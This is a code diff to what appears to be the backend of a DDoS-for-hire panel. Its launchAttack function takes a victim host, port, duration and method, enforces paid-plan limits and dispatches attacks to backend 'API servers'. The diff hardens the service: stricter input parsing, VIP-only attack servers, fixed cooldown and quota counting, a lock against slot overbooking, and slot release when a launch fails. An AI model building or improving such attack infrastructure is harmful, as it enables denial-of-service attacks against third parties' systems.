@@ -6,6 +6,7 @@ import { assertAllowedMethod, assertPublicTarget, buildAttackUrl } from "../lib/
 export interface AttackPlan {
     mbt: number;
     concurrents: number;
+    vip?: boolean;
 }
 
 export interface AttackInput {
@@ -30,6 +31,7 @@ interface ApiServerRow {
     api: string;
     slots: number;
     methods: string;
+    vip: number;
 }
 
 /**
@@ -46,12 +48,12 @@ export async function launchAttack(options: {
 }): Promise<AttackResult> {
     const { input, plan, admin } = options;
     const host = await assertPublicTarget(input.host ?? "");
-    const seconds = Number.parseInt(input.time ?? "", 10);
-    if (!Number.isFinite(seconds) || seconds <= 0 || seconds > 3600) {
+    const seconds = Number(input.time ?? "");
+    if (!Number.isInteger(seconds) || seconds <= 0 || seconds > 3600) {
         throw new HttpError(400, "Invalid attack time.");
     }
-    const port = Number.parseInt(input.port || "80", 10);
-    if (!Number.isFinite(port) || port < 1 || port > 65535) {
+    const port = Number(input.port || "80");
+    if (!Number.isInteger(port) || port < 1 || port > 65535) {
         throw new HttpError(400, "Invalid port. Must be between 1 and 65535.");
     }
     if (plan && seconds > plan.mbt) {
@@ -85,7 +87,7 @@ export async function launchAttack(options: {
             const cooldown = settings?.cooldown ? Number(settings.cooldownTime) : 0;
             if (cooldown > 0) {
                 const last = await webDb.logs.findFirst({
-                    where: { user: options.username },
+                    where: { user: options.username, time: { gt: 0 } },
                     orderBy: { date: "desc" },
                     select: { date: true },
                 });
@@ -99,7 +101,11 @@ export async function launchAttack(options: {
             const maxAttacks = Number(settings?.maxattacks ?? 0);
             if (maxAttacks > 0) {
                 const recent = await webDb.logs.count({
-                    where: { user: options.username, date: { gte: now - 86400 } },
+                    where: {
+                        user: options.username,
+                        date: { gte: now - 86400 },
+                        time: { gt: 0 },
+                    },
                 });
                 if (recent >= maxAttacks) {
                     throw new HttpError(
@@ -123,9 +129,12 @@ export async function launchAttack(options: {
         if (candidate && !matching.includes(candidate)) {
             throw new HttpError(400, "The selected API server does not support that method.");
         }
-        const pool = candidate ? [candidate] : matching;
-        if (pool.length === 0)
-            throw new HttpError(400, "No API server supports the selected method.");
+        const pool = (candidate ? [candidate] : matching).filter((server) => {
+            if (admin) return true;
+            if (Number(server.vip) !== 1) return true;
+            return Boolean(options.plan?.vip);
+        });
+        if (pool.length === 0) throw new HttpError(403, "That server is reserved for VIP plans.");
 
         let best: ApiServerRow | undefined;
         let lowest = Infinity;
@@ -148,6 +157,48 @@ export async function launchAttack(options: {
             time: String(seconds),
             method,
         });
+        // The operator-configured API endpoint is itself an SSRF sink: a
+        // compromised admin account must not be able to point it at metadata
+        // or loopback.
+        try {
+            await assertPublicTarget(new URL(attackUrl).hostname);
+        } catch {
+            throw new HttpError(500, "The API server URL must target a public host.");
+        }
+
+        // Reserve the slot before the network call. The per-user lock does not
+        // serialize different users, so this second lock is what keeps the
+        // server's slot count honest under concurrent launches.
+        const now = Math.floor(Date.now() / 1000);
+        let logId = 0;
+        const chosen = best;
+        await withLock("server:" + chosen.name, async () => {
+            expireFinishedAttacks();
+            const active = await webDb.logs.count({
+                where: { stopped: 0, handler: chosen.name, time: { gt: 0 } },
+            });
+            if (active >= chosen.slots) {
+                throw new HttpError(429, "All API servers are at full capacity.");
+            }
+            const created = await webDb.logs.create({
+                data: {
+                    user: admin ? "admin" : options.username,
+                    ip: host,
+                    time: seconds,
+                    method,
+                    postdata: String(port),
+                    mode: "api",
+                    ratelimit: "0",
+                    cookie: "0",
+                    date: now,
+                    chart: new Date(now * 1000).toISOString().slice(0, 19).replace("T", " "),
+                    stopped: 0,
+                    handler: chosen.name,
+                    origin: options.origin,
+                },
+            });
+            logId = Number(created.id);
+        });
 
         let ok = false;
         try {
@@ -158,30 +209,17 @@ export async function launchAttack(options: {
             });
             ok = res.ok;
         } catch {
-            // Logged below even when the API server is unreachable.
+            // Handled below: the reservation is released and the failure logged.
         }
 
-        const now = Math.floor(Date.now() / 1000);
-        await webDb.logs.create({
-            data: {
-                user: admin ? "admin" : options.username,
-                ip: host,
-                time: seconds,
-                method,
-                postdata: String(port),
-                mode: "api",
-                ratelimit: "0",
-                cookie: "0",
-                date: now,
-                chart: new Date(now * 1000).toISOString().slice(0, 19).replace("T", " "),
-                stopped: 0,
-                handler: best.name,
-                origin: options.origin,
-            },
-        });
-        if (!ok)
-            throw new HttpError(502, "Attack was logged but the API server may be unreachable.");
+        if (!ok) {
+            await webDb.logs.update({
+                where: { id: logId },
+                data: { stopped: 1, time: 0 },
+            });
+            throw new HttpError(502, "The API server could not start the attack.");
+        }
 
-        return { host, port: String(port), seconds, method, server: best.name };
+        return { host, port: String(port), seconds, method, server: chosen.name };
     });
 }
